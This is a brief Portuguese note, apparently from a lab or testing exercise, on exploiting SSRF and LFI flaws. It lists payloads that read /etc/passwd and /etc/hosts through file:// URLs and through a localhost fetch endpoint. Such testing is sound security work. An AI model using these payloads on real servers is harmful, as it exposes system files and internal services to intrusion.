# Para explorar a vulnerabilidade SSRF e LFI

Há várias formas, incluindo protocolos, tais como FTP, SMB, SMTP, etc., porém, diante do cenário atual, testei 2 payloads, sendo os de **Leitura de arquivos** e **Acessos aplicações internas**.


**Payloads utilizados**

Para a anlise da vulnerabilidade utilizei os payloads abaixo:

<br/>

### Leitura de arquivos

Digite o comando abaixo:

```
file:///etc/passwd
```

```
file:///etc/hosts
```

### Acessos aplicações internas

Digite o comando abaixo:

```
http://localhost:5000/fetch?url=file%3A%2F%2F%2Fetc%2Fpasswd
```